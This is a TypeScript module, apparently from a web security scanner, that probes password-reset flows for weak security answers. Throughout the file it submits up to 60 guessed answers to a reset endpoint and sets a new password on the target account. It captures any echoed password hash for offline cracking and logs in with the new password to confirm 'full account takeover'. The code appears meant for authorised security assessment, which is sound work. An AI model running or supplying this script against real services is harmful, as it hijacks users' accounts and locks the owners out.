import { fetchUrl } from "../adapters/http.js";
import { writeArtifact } from "../adapters/artifacts.js";

/** Password-reset abuse surface: static/weak security answers accepted as
 *  sole credential, reset response echoing password hash (offline-crack
 *  material), and missing notification semantics. Confirmed = reset
 *  succeeded with a dictionary answer AND the new credential authenticates. */

export interface ResetInput {
  readonly resetUrl: string;
  readonly loginUrl: string;
  readonly email: string;
  readonly resetTemplate: string;
  readonly loginTemplate: string;
  readonly newPass: string;
  /** answer candidates (bounded) */
  readonly answers: readonly string[];
  readonly outputRoot: string;
  readonly headers?: Record<string, string>;
  readonly proxy?: string;
  readonly timeoutMs?: number;
}
export interface ResetResult {
  readonly tried: number;
  readonly acceptedAnswers: string[];
  readonly takeover: boolean;
  readonly hashEcho: string | null;
  readonly evidence: string;
  readonly cases: { answer: string; status: number; bodyPrefix: string }[];
  readonly artifacts: { path: string; bytes: number }[];
}

export const probeResetAbuse = async (input: ResetInput): Promise<ResetResult> => {
  const cases: ResetResult["cases"] = [];
  const accepted: string[] = [];
  let hashEcho: string | null = null;
  for (const a of input.answers.slice(0, 60)) {
    try {
      const body = input.resetTemplate.replaceAll("{EMAIL}", input.email).replaceAll("{ANSWER}", a).replaceAll("{NEWPASS}", input.newPass);
      const r = await fetchUrl(input.resetUrl, { method: "POST", body, headers: { "content-type": "application/json", ...(input.headers ?? {}) }, proxy: input.proxy, timeoutMs: input.timeoutMs ?? 12000, maxAttempts: 1 });
      cases.push({ answer: a, status: r.status, bodyPrefix: r.body.slice(0, 100) });
      const ok = r.status >= 200 && r.status < 300 && !/wrong|invalid|error|blocked/i.test(r.body.slice(0, 300));
      if (ok) {
        accepted.push(a);
        const m = /"password"\s*:\s*"([a-f0-9]{32,128})"/i.exec(r.body);
        if (m && m[1] && !hashEcho) hashEcho = m[1];
        break; // 接受即停(避免多次重置)
      }
    } catch { cases.push({ answer: a, status: 0, bodyPrefix: "" }); }
  }
  // takeover验证: 新密码登录
  let takeover = false; let evidence = "reset never accepted";
  if (accepted.length > 0) {
    try {
      const lb = input.loginTemplate.replaceAll("{EMAIL}", input.email).replaceAll("{PASS}", input.newPass);
      const r = await fetchUrl(input.loginUrl, { method: "POST", body: lb, headers: { "content-type": "application/json", ...(input.headers ?? {}) }, proxy: input.proxy, timeoutMs: input.timeoutMs ?? 12000, maxAttempts: 1 });
      takeover = r.status >= 200 && r.status < 300 && /token|authentication|jwt/i.test(r.body.toLowerCase());
      evidence = takeover ? `answer "${accepted[0]}" reset accepted; new password authenticates (${r.status}) — full account takeover` : `answer accepted but new password login returned ${r.status}`;
    } catch { evidence = `answer "${accepted[0]}" accepted; login verify transport failed`; }
  }
  const artifacts = [
    await writeArtifact(input.outputRoot, "reset_cases.json", JSON.stringify({ cases, accepted, takeover, hashEcho }, null, 2)),
    await writeArtifact(input.outputRoot, "reset_abuse.md", ["# Password-reset abuse", "", `- tried ${cases.length} answers, accepted: ${accepted.length}`, `- takeover: **${takeover}**`, `- password-hash echo: ${hashEcho ?? "none"}`, "", evidence].join("\n")),
  ];
  return { tried: cases.length, acceptedAnswers: accepted, takeover, hashEcho, evidence, cases, artifacts };
};
